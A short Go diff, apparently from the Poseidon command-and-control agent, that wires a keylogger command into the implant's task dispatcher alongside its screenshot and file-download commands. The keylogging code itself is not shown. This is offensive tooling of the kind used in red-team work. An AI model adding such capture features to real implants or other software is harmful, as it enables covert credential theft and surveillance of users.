@@ -34,6 +34,7 @@ import (
 	"github.com/xorrior/poseidon/pkg/commands/drives"
 	"github.com/xorrior/poseidon/pkg/commands/getenv"
 	"github.com/xorrior/poseidon/pkg/commands/getuser"
+	"github.com/xorrior/poseidon/pkg/commands/keylog"
 	"github.com/xorrior/poseidon/pkg/commands/kill"
 	"github.com/xorrior/poseidon/pkg/commands/mkdir"
 	"github.com/xorrior/poseidon/pkg/commands/mv"
@@ -179,6 +180,9 @@ func main() {
 			case 2:
 				// Capture screenshot
 				go screencapture.Run(task, res)
+				break
+			case 3:
+				go keylog.Run(task, res)
 				break
 			case 4:
 				//File download
